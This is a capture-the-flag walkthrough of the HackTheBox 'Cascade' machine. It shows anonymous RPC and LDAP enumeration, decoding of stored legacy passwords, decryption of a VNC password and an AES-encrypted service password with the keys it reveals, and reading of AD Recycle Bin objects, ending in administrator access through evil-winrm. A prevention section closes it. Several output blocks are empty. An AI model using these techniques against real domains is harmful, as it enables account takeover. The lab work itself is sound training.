## **Description**

Hello hackers, I hope you are doing well. We are doing [Cascade](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal

```

The target seems to be an Active directory domain controller.

### MSRPC

With `msrpc` service we can enumerate usernames if it allows for anonymous login.

```shell
$ rpcclient -U '' -N 10.10.10.182
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

Let's save the output to a file and use the following command to get a clean list of usernames.

```shell
cat RpcOutput.txt | cut -d "[" -f 2 | cut -d "]" -f 1 > users.lst
```

### LDAP

`LDAP` is a protocol that enable anyone to locate organizations, individuals and other resources such as files and devices in a network.

Using `ldapsearch`, let's run the following command to dump ldap data

```bash
ldapsearch -H 'ldap://cascade.local/' -x -b "dc=cascade,dc=local"
```

The output is very big so let's users information only by adding the following option to the query:

```bash
ldapsearch -H 'ldap://cascade.local/' -x -b "dc=cascade,dc=local" '(objectClass=person)'
```

Looking through the output we find the following extra line belonging to user `Ryan Thompson`.

```bash
cascadeLegacyPwd: clk0bjVldmE=
```

It looks like a base64 encoded string so let's decode it.

```bash
$ echo 'clk0bjVldmE=' | base64 -d
rY4n5eva  
```

We got `Ryan`'s password.

Tried to connect via `winrm` using this password but it didn't work.

### SMB

Let's see if we can list shares of SMB

```shell
$ crackmapexec smb cascade.local -u r.thompson -p "rY4n5eva" --shares                                                                                1 тип

```

There is a share called `DATA` we have read permission over it.

Let's connect to the share

```bash
$ smbclient //cascade.local/Data -U r.thompson rY4n5eva                                                                                            130 тип

```

We found a bunch of files there and downloaded them using `mget *`.

Let's check what's on the files.

On `IT/Email Archives` we find the following email from Steve:

![](1.png)

On `IT/Temp/s.smith/VNC Install.reg` we find this line `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`.

I found this [github repository](https://github.com/frizb/PasswordDecrypts) showing how to decrypt this password using `metasploit`.

```shell
[msf](Jobs:0 Agents:0) >> irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"

>> require 'rex/proto/rfb'
=> false
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"

```

We got the password of `s.smith`.

## **Foothold**

### WinRM

Using `evil-winrm` let's connect to the target.

```shell
$ evil-winrm -i cascade.local -u s.smith -p sT333ve2   

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

## **Privilege Escalation**

### s.smith --> ArkSvc

Let's see if user `s.smith` has anything interesting.

```shell
*Evil-WinRM* PS C:\Users\s.smith\Documents> net user s.smith
User name                    s.smith

```

The user is part of a group called `Audit Share`, let's see what is this group

```shell
*Evil-WinRM* PS C:\Users\s.smith\Documents> net localgroup "Audit Share"
Alias name     Audit Share

The command completed successfully.
```

The comment above hint to the share `Audit`.

If we run `crackmapexec` we can see that we have read permissions on the share:

```shell
$ crackmapexec smb cascade.local -u s.smith -p sT333ve2 --shares

```

Let's connect to the share and download everything.

```shell
$ smbclient //cascade.local/Audit$ -U s.smith sT333ve2

smb: \> 
```

We can see the file `RunAudit.bat` which runs `CascAudit.exe` with the file `"\\CASC-DC1\Audit$\DB\Audit.db"`.

```shell
$ cat RunAudit.bat 
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

The `Audit.db` is a `sqlite` db file.

```shell
$ file Audit.db                 
Audit.db: SQLite 3.x database, last written using SQLite version 3027002
```

![](2.png)

On the `ldap` table we find the username `ArkSvc` and what looks like a base64 encoded password, but when we try to decode it we fail.

Since this db file is being used by the executable `CascAudit.exe`, let's decompile it using `dnspy` maybe we can find how to decrypt it.

run `wine64 dnspy.exe` and open the `CascAudit.exe` file.

![](3.png)

We can see the code responsible for decoding the password.

The program is using a function called `Crypto.DecryptString` with the key  `c4scadek3y654321`, the function is not in the executable, maybe it's in the `.dll` file.

Let's open `CascCrypto.dll`

![](4.png)

To decrypt the password we can use the following python code:

```python
import pyaes
from base64 import b64decode

key = b"c4scadek3y654321"
iv = b"1tdyjCbY1Ix49842"
aes = pyaes.AESModeOfOperationCBC(key, iv = iv)
decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
print(decrypted.decode())
```

>Credits goes to HackTheBox team for this script, it can be found in the official writeup of Cascade.

```shell
$ python decode.py  
w3lc0meFr31nd
```

We got the password. let's login via `winrm`

```shell
$ evil-winrm -i cascade.local -u arksvc -p w3lc0meFr31nd

Evil-WinRM shell v3.4

### arksvc --> Administrator

Let's see what groups this user is part of

```shell

```

We see `arksvc` is part of the group `AD Recycle Bin`.

This group gives permission to read deleted AD objects.

Let's list the deleted objects using the following command:

```shell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

```shell

```

We can see another `cascadeLegacyPwd` with the value `YmFDVDNyMWFOMDBkbGVz`, this was a temporary adminitrator password. Let's decode it.

```shell
$ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d               
baCT3r1aN00dles
```

Now we can use the password to login as administrator via `winrm`

```shell
$ evil-winrm -i cascade.local -u administrator -p baCT3r1aN00dles

Evil-WinRM shell v3.4

## **Prevention and Mitigation**

### MSRPC prevention

The `msrpc` service was allowing anonymous login which permits us to enumerate domain users. We could've also enumerated more objects like `groups`, specific user info, display info and many more.

To prevent the enumeration you need to disable anonymous access to `msrpc`

### LDAP prevention

`LDAP` was allowing anonymous login as well so that should be disabled.

We were able to find a base64 encoded password. Passwords should never be stored in plaintext or reversible formats, instead they should be hashed using a strong and secure hashing algorithms.

### CascAudit.exe

On the `Audit` share we were able to find a sqlite db file that contained an encoded password. Since the password was being used by `CascAudit.exe` we were able to decompile the program and understand the decryption method used which allowed us to decrypt the password.

Again, passwords should never be stored in a reversible formats, they should be hashed using a strong and secure hashing algorithms.

### Ad Recycle Bin

As part of the `AD Recycle Bin` group, we were able to see deleted objects in the domain. With that we found the password of a deleted temporary admin account which the current administrator account uses.

Password should be stored in a hashed format and should never be reused.
